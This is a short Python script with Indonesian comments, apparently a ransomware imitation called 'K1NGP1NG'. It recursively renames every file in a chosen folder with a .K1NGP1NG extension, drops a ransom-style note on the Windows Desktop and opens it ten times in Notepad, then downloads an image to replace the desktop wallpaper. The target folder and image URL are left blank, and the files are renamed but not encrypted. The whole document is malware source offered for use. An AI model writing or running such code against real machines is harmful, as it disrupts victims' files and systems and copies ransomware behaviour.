import os
import urllib.request
import ctypes
import subprocess
import time

# Fungsi untuk mengganti ekstensi file menjadi .K1NGP1NG
def change_extension(file_path):
    try:
        # File baru dengan ekstensi .K1NGP1NG
        new_file_path = file_path + '.K1NGP1NG'

        # Ganti nama file menjadi ekstensi baru
        os.rename(file_path, new_file_path)

        return True, f"{file_path} berhasil diubah menjadi {new_file_path}"

    except Exception as e:
        return False, f"Gagal mengganti ekstensi {file_path}: {e}"

# Fungsi untuk mengganti ekstensi semua file dalam folder
def process_folder(folder_path):
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            success, message = change_extension(file_path)
            print(message)

# Fungsi untuk membuat catatan di desktop
def note():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(desktop_path, 'K1NGP1NG-N0T3.txt')

    with open(note_path, 'w') as f:
        f.write('fufufafa')

    # Membuka file sebanyak 10 kali dengan delay
    for _ in range(10):
        subprocess.Popen(['notepad.exe', note_path])  # Ganti 'notepad.exe' dengan aplikasi lain jika diperlukan
        time.sleep(2)  # Delay 1 detik antara setiap pembukaan

    return note_path

# Fungsi untuk mengganti wallpaper desktop
def change_desktop_background():
    imageUrl = ''
    path = os.path.join(os.environ['TEMP'], 'k1ngp1ng.jpg')
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)

if __name__ == "__main__":
    folder_to_process = ""  # Ganti dengan folder yang ingin diproses
    process_folder(folder_to_process)
    note()
    change_desktop_background()
